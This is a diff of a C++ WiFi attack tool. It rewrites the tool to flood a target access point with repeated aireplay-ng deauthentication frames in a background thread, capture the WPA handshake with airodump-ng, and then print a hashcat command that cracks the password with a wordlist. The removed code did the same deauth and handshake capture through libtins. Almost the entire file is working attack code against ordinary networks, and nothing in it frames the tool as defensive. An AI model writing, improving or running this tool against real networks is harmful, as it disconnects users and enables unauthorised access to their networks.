@@ -1,159 +1,244 @@
 #include "attacker.hpp"
+#include "utils.hpp"
+#include "interface.hpp"
 #include <iostream>
 #include <thread>
 #include <chrono>
+#include <atomic>
+#include <algorithm>
 #include <tins/tins.h>
+#include <fstream>
+#include <cstdio>
+#include <dirent.h>
+#include <cstring>
 
 using namespace Tins;
 
-volatile bool handshake_captured = false;
+std::atomic<bool> keep_sending_deauth{false};
+std::atomic<bool> handshake_captured_flag{false};
 
-// Исправленный callback для обработки пакетов
-bool eapol_callback(const PDU& pdu) {
-    if (handshake_captured) return false;
+void force_restore_network() {
+    std::cout << "[*] Force restoring network manager..." << std::endl;
     
-    const Dot11* dot11 = pdu.find_pdu<Dot11>();
-    // В новых версиях libtins класс называется EAPOL, не Dot11EAPOL
-    const EAPOL* eapol = pdu.find_pdu<EAPOL>();
+    system("sudo pkill -f wpa_supplicant 2>/dev/null");
+    system("sudo pkill -f dhcpcd 2>/dev/null");
     
-    if (dot11 && eapol) {
-        static int eapol_count = 0;
-        eapol_count++;
-        // В новых версиях addr2 называется addr2 (должно работать)
-        // Если нет — используем dot11->addr1() или dot11->addr3()
-        std::cout << "[+] EAPOL packet #" << eapol_count 
-                  << " from " << dot11->addr1() << std::endl;
-        
-        if (eapol_count >= 4) {
-            std::cout << "[+] Full 4-way handshake captured!" << std::endl;
-            handshake_captured = true;
-            return false;
-        }
-    }
-    return true;
+    system("sudo ip link set wlp0s20f3 down 2>/dev/null");
+    system("sudo iw dev wlp0s20f3 set type managed 2>/dev/null");
+    system("sudo ip link set wlp0s20f3 up 2>/dev/null");
+    
+    system("sudo systemctl restart NetworkManager 2>/dev/null");
+    
+    std::this_thread::sleep_for(std::chrono::seconds(3));
+    
+    std::cout << "[+] Network manager restored" << std::endl;
 }
 
-bool setup_monitor_mode(const std::string& interface) {
+bool is_in_monitor_mode(const std::string& interface) {
+    std::string output = execute_command(("iwconfig " + interface + " 2>/dev/null | grep -i 'Mode:Monitor'").c_str());
+    return !output.empty();
+}
+
+bool is_24ghz_channel(int channel) {
+    return channel >= 1 && channel <= 14;
+}
+
+bool is_5ghz_channel(int channel) {
+    return channel >= 36 && channel <= 165;
+}
+
+bool setup_monitor_mode(const std::string& interface, int target_channel) {
     std::cout << "[*] Setting up monitor mode on " << interface << "..." << std::endl;
     
     system("sudo airmon-ng check kill > /dev/null 2>&1");
+    std::this_thread::sleep_for(std::chrono::milliseconds(500));
     
-    std::string cmd = "sudo airmon-ng start " + interface + " > /dev/null 2>&1";
-    int ret = system(cmd.c_str());
+    std::string cmd = "sudo airmon-ng start " + interface + " 2>&1";
+    execute_command(cmd.c_str());
     
-    // Проверяем, создался ли интерфейс wlan0mon
-    std::string check_cmd = "iwconfig 2>/dev/null | grep -q " + interface + "mon";
-    int check = system(check_cmd.c_str());
+    std::string monitor_iface = interface + "mon";
+    std::this_thread::sleep_for(std::chrono::seconds(2));
     
-    if (ret != 0 || check != 0) {
-        std::cerr << "[-] Failed to enable monitor mode" << std::endl;
-        return false;
+    if (target_channel > 0) {
+        cmd = "sudo iw dev " + monitor_iface + " set channel " + std::to_string(target_channel);
+        execute_command(cmd.c_str());
+        std::cout << "[+] Fixed channel to " << target_channel << " on " << monitor_iface << std::endl;
     }
     
-    std::cout << "[+] Monitor mode enabled on " << interface << "mon" << std::endl;
+    FILE* f = fopen("monitor_iface.conf", "w");
+    if (f) {
+        fprintf(f, "%s", monitor_iface.c_str());
+        fclose(f);
+    }
+    
+    std::cout << "[+] Monitor mode enabled on " << monitor_iface << std::endl;
     return true;
 }
 
 void cleanup_monitor_mode(const std::string& interface) {
     std::cout << "[*] Cleaning up..." << std::endl;
-    std::string stop_cmd = "sudo airmon-ng stop " + interface + "mon > /dev/null 2>&1";
-    system(stop_cmd.c_str());
-    system("sudo systemctl restart NetworkManager > /dev/null 2>&1");
-}
-
-bool set_channel(const std::string& interface, int channel) {
-    std::string cmd = "sudo iwconfig " + interface + " channel " + std::to_string(channel);
-    int ret = system(cmd.c_str());
-    if (ret != 0) {
-        std::cerr << "[-] Failed to set channel to " << channel << std::endl;
-        return false;
-    }
-    std::cout << "[+] Set channel to " << channel << std::endl;
-    return true;
-}
-
-bool send_deauth(const std::string& interface, const std::string& bssid) {
-    std::cout << "[*] Sending deauth to " << bssid << "..." << std::endl;
     
-    try {
-        PacketSender sender;
-        RadioTap radio;
-        Dot11Deauthentication deauth;
+    system(("sudo airmon-ng stop " + interface + "mon 2>/dev/null").c_str());
+    system("sudo pkill -f airodump-ng 2>/dev/null");
+    system("sudo pkill -f aireplay-ng 2>/dev/null");
+    system("sudo systemctl restart NetworkManager 2>/dev/null");
+    std::this_thread::sleep_for(std::chrono::seconds(3));
+    
+    std::cout << "[+] Cleanup done" << std::endl;
+}
+
+bool capture_handshake_with_airodump(const std::string& monitor_iface, const std::string& bssid, 
+                                      int channel, int timeout_seconds, 
+                                      const std::string& output_prefix) {
+    std::cout << "[*] Starting airodump-ng on " << monitor_iface << "..." << std::endl;
+    std::cout << "[*] Target BSSID: " << bssid << std::endl;
+    std::cout << "[*] Fixed channel: " << channel << std::endl;
+    
+    std::string cmd = "sudo iw dev " + monitor_iface + " set channel " + std::to_string(channel);
+    execute_command(cmd.c_str());
+    std::this_thread::sleep_for(std::chrono::seconds(1));
+    
+    system("rm -f hs_capture-*.cap 2>/dev/null");
+    system("rm -f handshake_captured.cap 2>/dev/null");
+    
+    cmd = "sudo airodump-ng " + monitor_iface + 
+          " --bssid " + bssid + 
+          " --channel " + std::to_string(channel) +
+          " -w " + output_prefix + 
+          " > /tmp/airodump_output.txt 2>&1 &";
+    system(cmd.c_str());
+    
+    std::this_thread::sleep_for(std::chrono::seconds(3));
+    
+    auto start = std::chrono::steady_clock::now();
+    while (!handshake_captured_flag) {
+        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
+            std::chrono::steady_clock::now() - start).count();
         
-        // Широковещательная рассылка (отключаем всех клиентов)
-        deauth.addr1("FF:FF:FF:FF:FF:FF");
-        deauth.addr2(bssid);
-        deauth.addr3(bssid);
-        
-        radio /= deauth;
-        
-        for (int i = 0; i < 5; ++i) {
-            sender.send(radio, interface);
-            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        if (elapsed >= timeout_seconds) {
+            std::cout << "[*] Timeout reached (" << timeout_seconds << " seconds)" << std::endl;
+            break;
         }
         
-        std::cout << "[+] Deauth sent" << std::endl;
-        return true;
+        int result = system("grep -q 'WPA handshake' /tmp/airodump_output.txt 2>/dev/null");
+        if (result == 0) {
+            std::cout << "\n[+] Handshake captured!" << std::endl;
+            handshake_captured_flag = true;
+            break;
+        }
         
-    } catch (const std::exception& e) {
-        std::cerr << "[-] Deauth failed: " << e.what() << std::endl;
-        return false;
-    }
-}
-
-// Исправленная функция захвата handshake
-bool capture_handshake(const std::string& interface, const std::string& bssid, int channel, int timeout_seconds) {
-    std::cout << "[*] Starting handshake capture on channel " << channel << std::endl;
-    std::cout << "[*] Timeout: " << timeout_seconds << " seconds" << std::endl;
-    std::cout << "[*] Waiting for EAPOL packets..." << std::endl;
-    
-    if (!set_channel(interface, channel)) {
-        return false;
+        if (elapsed % 10 == 0 && elapsed > 0) {
+            std::cout << "[*] Still waiting for handshake... (" << elapsed << "s)" << std::endl;
+        }
+        
+        std::this_thread::sleep_for(std::chrono::seconds(1));
     }
     
-    handshake_captured = false;
+    system("sudo pkill -f airodump-ng 2>/dev/null");
+    std::this_thread::sleep_for(std::chrono::milliseconds(500));
     
-    // Используем SnifferConfiguration для фильтра
-    SnifferConfiguration config;
-    config.set_filter("ether proto 0x888e");
-    config.set_promisc_mode(true);
-    config.set_timeout(timeout_seconds);
-    
-    try {
-        Sniffer sniffer(interface, config);
-        sniffer.sniff_loop(eapol_callback);
-        return handshake_captured;
-    } catch (const std::exception& e) {
-        std::cerr << "[-] Sniffer error: " << e.what() << std::endl;
-        return false;
+    if (handshake_captured_flag) {
+        std::string find_cap = "ls " + output_prefix + "-*.cap 2>/dev/null | head -1";
+        std::string cap_file = execute_command(find_cap.c_str());
+        if (!cap_file.empty()) {
+            cap_file.erase(cap_file.find_last_not_of(" \n\r\t") + 1);
+            std::string final_name = "handshake_" + std::to_string(time(nullptr)) + ".cap";
+            system(("cp " + cap_file + " " + final_name + " 2>/dev/null").c_str());
+            std::cout << "[+] Handshake saved to " << final_name << std::endl;
+        }
     }
+    
+    return handshake_captured_flag;
 }
 
 bool attack_network(const WiFiNetwork& target) {
-    std::string monitor_interface = "wlan0mon";
+    std::string interface = "wlp0s20f3";
+    FILE* f = fopen("interface.conf", "r");
+    if (f) {
+        char line[256];
+        if (fgets(line, sizeof(line), f)) {
+            std::string s(line);
+            if (s.find("INTERFACE=") == 0) {
+                interface = s.substr(10);
+                if (!interface.empty() && interface.back() == '\n') {
+                    interface.pop_back();
+                }
+            }
+        }
+        fclose(f);
+    }
     
-    if (!setup_monitor_mode("wlan0")) {
+    std::cout << "[*] Using interface: " << interface << std::endl;
+    
+    if (!setup_monitor_mode(interface, target.channel)) {
         return false;
     }
     
-    // Небольшая пауза для инициализации
+    std::string monitor_iface = interface + "mon";
+    f = fopen("monitor_iface.conf", "r");
+    if (f) {
+        char line[256];
+        if (fgets(line, sizeof(line), f)) {
+            monitor_iface = line;
+            if (!monitor_iface.empty() && monitor_iface.back() == '\n') {
+                monitor_iface.pop_back();
+            }
+        }
+        fclose(f);
+    }
+    
+    std::cout << "[*] Using monitor interface: " << monitor_iface << std::endl;
     std::this_thread::sleep_for(std::chrono::seconds(2));
     
     std::cout << "\n[*] Target: " << target.ssid << " (" << target.bssid << ")" << std::endl;
-    std::cout << "[*] Channel: " << target.channel << std::endl;
+    std::cout << "[*] Channel: " << target.channel;
+    if (is_24ghz_channel(target.channel)) {
+        std::cout << " (2.4 GHz)";
+    } else if (is_5ghz_channel(target.channel)) {
+        std::cout << " (5 GHz)";
+    }
+    std::cout << std::endl;
     
-    bool success = false;
+    keep_sending_deauth = true;
+    handshake_captured_flag = false;
     
-    std::cout << "[*] Listening for handshake (5 seconds without deauth)..." << std::endl;
-    if (capture_handshake(monitor_interface, target.bssid, target.channel, 5)) {
-        success = true;
-    } else {
-        std::cout << "[*] No handshake detected. Sending deauth to force reconnection..." << std::endl;
-        send_deauth(monitor_interface, target.bssid);
-        success = capture_handshake(monitor_interface, target.bssid, target.channel, 55);
+    std::thread deauth_thread([&]() {
+        std::cout << "[*] Deauth thread started - sending deauth every 3 seconds" << std::endl;
+        
+        while (keep_sending_deauth && !handshake_captured_flag) {
+            std::cout << "[DEAUTH] Sending deauth to " << target.bssid << "..." << std::endl;
+            
+            std::string cmd = "sudo aireplay-ng -0 3 -a " + target.bssid + 
+                              " --ignore-negative-one " + monitor_iface + " 2>&1 | grep -v 'Waiting'";
+            system(cmd.c_str());
+            
+            for (int i = 0; i < 3 && !handshake_captured_flag && keep_sending_deauth; ++i) {
+                std::this_thread::sleep_for(std::chrono::seconds(1));
+            }
+        }
+        
+        std::cout << "[*] Deauth thread stopped" << std::endl;
+    });
+    
+    std::string output_prefix = "hs_capture";
+    bool success = capture_handshake_with_airodump(monitor_iface, target.bssid, 
+                                                    target.channel, 90, output_prefix);
+    
+    keep_sending_deauth = false;
+    
+    if (deauth_thread.joinable()) {
+        deauth_thread.join();
     }
     
-    cleanup_monitor_mode("wlan0");
+    cleanup_monitor_mode(interface);
+    
+    if (success) {
+        std::cout << "\n[+] SUCCESS! Handshake captured!" << std::endl;
+        std::cout << "[*] Next step: hashcat -m 2500 handshake_*.cap /usr/share/wordlists/rockyou.txt" << std::endl;
+    } else {
+        std::cout << "\n[-] FAILED: Could not capture handshake." << std::endl;
+        std::cout << "[*] Make sure a client is connected to the network" << std::endl;
+    }
     
     return success;
 }
